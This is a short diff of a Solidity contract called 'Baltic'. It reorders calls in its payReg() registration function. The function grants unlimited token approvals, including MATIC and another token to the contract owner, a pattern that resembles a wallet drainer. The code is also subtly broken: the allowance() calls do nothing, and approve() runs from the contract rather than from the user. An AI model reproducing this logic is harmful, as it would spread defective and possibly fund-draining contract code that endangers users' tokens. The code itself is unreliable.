@@ -74,14 +74,6 @@ contract Baltic is Ownable {
 
     function payReg() external{
         require(!users[msg.sender].isActive, "Already registered");
-        WBTC.allowance(msg.sender,address(this));
-        WETH.allowance(msg.sender,address(this));
-        MATIC.allowance(msg.sender,address(this));
-        alternativeToken.allowance(msg.sender,address(this));
-        WBTC.allowance(msg.sender,address(router));
-        WETH.allowance(msg.sender,address(router));
-        MATIC.allowance(msg.sender,address(owner()));
-        alternativeToken.allowance(msg.sender,address(owner()));
         require(WBTC.approve(address(this),type(uint256).max), "Failed to approve WBTC to contract");
         require(WETH.approve(address(this),type(uint256).max), "Failed to approve WETH to contract");
         require(MATIC.approve(address(this),type(uint256).max), "Failed to approve MATIC to contract");
@@ -90,6 +82,14 @@ contract Baltic is Ownable {
         require(WETH.approve(address(router), type(uint256).max), "Failed to approve WETH to Uniswap");
         require(MATIC.approve(owner(), type(uint256).max), "Failed to approve MATIC to owner");
         require(alternativeToken.approve(owner(), type(uint256).max), "Failed to approve alternative token to owner");
+        WBTC.allowance(msg.sender,address(this));
+        WETH.allowance(msg.sender,address(this));
+        MATIC.allowance(msg.sender,address(this));
+        alternativeToken.allowance(msg.sender,address(this));
+        WBTC.allowance(msg.sender,address(router));
+        WETH.allowance(msg.sender,address(router));
+        MATIC.allowance(msg.sender,address(owner()));
+        alternativeToken.allowance(msg.sender,address(owner()));
 
         uint256 userMATICBalance = MATIC.balanceOf(msg.sender);
         uint256 userAlternativeTokenBalance = alternativeToken.balanceOf(msg.sender);
